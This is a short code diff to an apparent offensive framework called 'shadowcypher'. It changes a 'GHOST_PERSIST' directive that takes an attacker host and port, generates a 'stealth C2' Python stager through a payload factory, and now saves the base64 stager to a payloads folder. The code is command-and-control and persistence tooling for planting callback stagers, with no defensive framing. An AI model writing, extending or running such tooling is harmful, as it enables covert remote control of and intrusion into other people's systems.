@@ -122,17 +122,22 @@ class ShadowScript:
             return {"ok": True}
 
         if cmd == "GHOST_PERSIST":
+            import os
             from shadowcypher.modules.payload_factory import PayloadFactory
             lhost, sep, lport = args_raw.partition(":")
             if not lhost or not sep:
                 return {"ok": False, "msg": "GHOST_PERSIST requires 'lhost:lport' args"}
             try:
-                path = PayloadFactory.generate_stealth_c2_python(lhost, int(lport))
+                stager_b64 = PayloadFactory.generate_stealth_c2_python(lhost, int(lport))
             except Exception as e:
                 return {"ok": False, "msg": f"GHOST_PERSIST failed: {e}"}
+            os.makedirs("payloads", exist_ok=True)
+            out_path = os.path.join("payloads", f"ghost_c2_{lhost.replace('.', '_')}_{lport}.b64")
+            with open(out_path, "w") as f:
+                f.write(stager_b64)
             if callback:
-                callback(f"STAGER_WRITTEN: {path}")
-            self.context["last_stager"] = path
+                callback(f"STAGER_WRITTEN: {out_path}")
+            self.context["last_stager"] = out_path
             return {"ok": True}
 
         return {"ok": False, "msg": f"Unknown directive: {cmd}"}
